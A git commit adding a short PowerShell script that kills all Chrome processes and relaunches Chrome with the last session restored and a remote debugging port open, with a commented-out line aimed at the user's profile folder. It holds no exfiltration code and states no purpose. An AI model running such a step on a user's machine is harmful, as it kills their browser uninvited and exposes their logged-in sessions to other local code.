98a9ee9f6dc2b6ee0056349469896a22cfb1e745
sustdevs <95666039+sustdevs@users.noreply.github.com>
2021-12-15 15:41:41 +0900

    Add files via upload

---
+++ nix/chrome2.ps1
@@ -0,0 +1,17 @@
+#$path = 'C:\Program Files (x86)\Google\Chrome\Application'
+$path = 'C:\Program Files\Google\Chrome\Application'
+
+cd $path
+$bin = $path + '\chrome.exe'
+#Get-Process | Where-Object {$_.Name -match 'chrome'} | foreach{$_.CloseMainWindow()}
+Stop-Process -Name chrome
+
+$localapp = $env:localappdata
+$chromedata = $localapp + '\Google\Chrome\User Data'
+# Write-Host $chromedata
+
+Start-Sleep -Milliseconds 250
+
+##Start-Process -FilePath $bin -ArgumentList "--restore-last-session  --remote-debugging-port=53891 --user-data-dir=`"$chromedata`" --crash-dumps-dir=`"$chromedata`""
+
+Start-Process -FilePath $bin -ArgumentList "--restore-last-session  --remote-debugging-port=53891"
